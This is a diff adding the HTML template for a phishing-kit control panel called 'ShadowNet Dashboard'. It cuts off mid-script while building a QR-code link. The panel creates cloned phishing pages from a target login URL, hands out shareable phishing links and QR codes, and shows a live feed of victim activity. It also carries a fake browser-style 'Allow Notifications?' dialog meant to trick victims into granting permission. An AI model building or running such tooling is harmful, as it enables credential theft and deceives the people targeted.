@@ -1,0 +1,101 @@
+{% extends "base.html" %}
+
+{% block title %}ShadowNet Dashboard{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-6">
+        <div class="card mb-4">
+            <div class="card-header">
+                <h5 class="mb-0">Create New Phishing Campaign</h5>
+            </div>
+            <div class="card-body">
+                <form id="create-form">
+                    <div class="mb-3">
+                        <label for="target-url" class="form-label">Target URL</label>
+                        <input type="url" class="form-control" id="target-url" placeholder="https://example.com/login" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Create Phishing Page</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-6">
+        <div class="card mb-4">
+            <div class="card-header">
+                <h5 class="mb-0">Campaign Result</h5>
+            </div>
+            <div class="card-body">
+                <div id="result-container" class="d-none">
+                    <div class="mb-3">
+                        <label for="result-url" class="form-label">Phishing URL</label>
+                        <div class="input-group">
+                            <input type="text" class="form-control" id="result-url" readonly>
+                            <button class="btn btn-outline-secondary" type="button" id="copy-btn">Copy</button>
+                        </div>
+                    </div>
+                    <div class="d-flex justify-content-between">
+                        <button class="btn btn-sm btn-outline-primary" id="qr-btn">Generate QR Code</button>
+                        <button class="btn btn-sm btn-outline-danger" id="delete-btn">Delete Campaign</button>
+                    </div>
+                </div>
+                <div id="placeholder" class="text-center text-muted">
+                    <p>No campaign created yet. Create one to see the result here.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h5 class="mb-0">Live Victim Activity</h5>
+                <span class="badge bg-success" id="connection-status">Connected</span>
+            </div>
+            <div class="card-body">
+                <div id="victims-container">
+                    <div class="text-center text-muted">
+                        <p>No victim activity yet. Share your phishing link to start tracking.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Permission Dialog Template -->
+<div id="permission-dialog" class="permission-dialog">
+    <div class="permission-header">
+        <svg class="permission-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#4285f4"/>
+        </svg>
+        <div class="permission-title">Allow Notifications?</div>
+    </div>
+    <div class="permission-message">
+        This website wants to show notifications. You can change this anytime in your settings.
+    </div>
+    <div class="permission-buttons">
+        <button class="permission-btn block-btn">Block</button>
+        <button class="permission-btn allow-btn" id="allow-permission">Allow</button>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // Copy URL functionality
+    document.getElementById('copy-btn').addEventListener('click', function() {
+        const urlInput = document.getElementById('result-url');
+        urlInput.select();
+        document.execCommand('copy');
+        showNotification('URL copied to clipboard!', 'success');
+    });
+
+    // QR Code generation
+    document.getElementById('qr-btn').addEventListener('click', function() {
+        const url = document.getElementById('result-url').value;
+        if (url) {
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?
